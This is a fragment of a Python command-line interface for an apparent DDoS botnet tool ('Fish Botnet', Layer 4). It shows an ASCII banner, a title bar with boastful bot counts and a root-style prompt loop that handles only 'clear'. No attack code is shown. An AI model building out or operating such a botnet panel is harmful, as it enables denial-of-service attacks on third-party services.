...
░▒█░   ░██░▒██████▒▒░▓█▒░██▓░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
 ...
 ░ ░    ▒ ░░  ░  ░   ░  ░░ ░ ░    ░ ░ ░ ░ ▒    ░         ░   ░ ░    ░    ░      
        ░        ░   ░  ░  ░ ░          ░ ░                    ░    ░  ░        
                                  ░                                             
Welcome To DDoS [ Layer4 ] By Virus™ + Phuc Ta Ram
DDoS By Fish Botnet
Version 1.0 Beta
2023 - 2024
...
def main():
	...
	while True:
		...
		sys.stdout.write("\x1b]2; Fish Botnet | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Botnet Client: [18497305]\x07".format (bots))
		sin = input("\033[0;30;45mFISH @ BOTNET\x1b[1;37m\033[0m</>root -> \x1b[1;37m\033[0m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
